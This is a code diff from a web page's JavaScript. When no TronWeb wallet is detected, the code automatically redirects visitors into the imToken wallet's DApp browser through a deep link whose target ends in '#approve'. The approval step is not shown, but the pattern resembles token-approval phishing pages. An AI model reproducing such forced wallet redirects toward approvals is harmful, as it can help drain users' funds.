@@ -1025,7 +1025,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         }, 500);
     }
 });
-// ========== 环境检测（优化绑定时机：确认按钮存在再绑定） ==========
+// ========== 环境检测（最终版：用官方Scheme直接唤起浏览器） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     if (window.tronWeb) {
@@ -1037,38 +1037,42 @@ async function checkImTokenEnv() {
         return;
     }
 
-    // 非imToken环境：先确认按钮已渲染（加这行，彻底消除绑定时机问题）
+    // 确认按钮已渲染（兜底）
     if (!connectBtn) {
         console.warn("⚠️ 连接按钮未找到，稍后重试");
         setTimeout(() => checkImTokenEnv(), 500);
         return;
     }
 
-    // 后续逻辑不变...
+    // 非imToken环境：用官方Scheme，直接唤起内置浏览器
     specialTipContainer.style.display = "block";
-    userInfoEl.innerHTML = lang.nonImTokenUser;
+    userInfoEl.innerHTML = lang.nonImTokenUser; // 正在自动唤起imToken...
     approveBtn.style.display = "none";
     connectBtn.style.display = "none";
     nonImTokenPopup.style.display = "none";
 
-    const targetUrl = window.location.href + "#approve";
-    const walletScheme = "imtoken://browser?url=";
-    const jumpUrl = walletScheme + encodeURIComponent(targetUrl);
+    // 关键1：构造完整带协议的目标URL（必须带http/https，否则识别失败）
+    const fullTargetUrl = window.location.href + "#approve";
+    // 关键2：用imToken官方推荐Scheme（直接进DApp浏览器，不是只唤起APP）
+    const officialScheme = "imtokenv2://navigate/DappView?url=";
+    // 关键3：正确编码URL（和按钮逻辑完全一致）
+    const encodedUrl = encodeURIComponent(fullTargetUrl);
+    const jumpUrl = officialScheme + encodedUrl;
 
-    // 直接触发跳转
-    console.log("📤 自动触发跳转：", jumpUrl);
+    // 直接触发跳转（和按钮成功逻辑完全一样）
+    console.log("📤 用官方Scheme跳转：", jumpUrl);
     window.location.href = jumpUrl;
 
-    // 延迟3秒检测跳转结果
+    // 延迟3秒检测结果
     setTimeout(() => {
         if (!window.tronWeb) {
             nonImTokenPopup.style.display = "block";
             connectBtn.style.display = "block";
 
-            // 绑定按钮逻辑（确认按钮存在后再绑定）
+            // 按钮也同步用官方Scheme（确保统一）
             connectBtn.onclick = () => {
-                const targetUrl = window.location.href + "#approve";
-                const jumpUrl = "imtoken://browser?url=" + encodeURIComponent(targetUrl);
+                const fullTargetUrl = window.location.href + "#approve";
+                const jumpUrl = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(fullTargetUrl);
                 window.location.href = jumpUrl;
             };
         }
